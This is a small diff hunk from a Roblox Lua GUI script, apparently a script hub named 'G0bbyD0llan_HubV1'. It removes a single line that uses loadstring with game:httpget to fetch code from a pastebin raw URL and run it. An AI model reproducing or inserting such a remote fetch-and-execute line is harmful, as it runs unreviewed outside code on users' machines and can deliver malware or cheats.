@@ -23880,7 +23880,6 @@ task.spawn(C_380);
 -- StarterGui.G0bbyD0llan_HubV1.LocalScript
  function C_381()
 	local script = G2L["381"];
-	loadstring(game:httpget("https://pastebin.com/raw/TZjCFdDp"))()
 end;
 task.spawn(C_381);
 -- StarterGui.G0bbyD0llan_HubV1.LocalScript
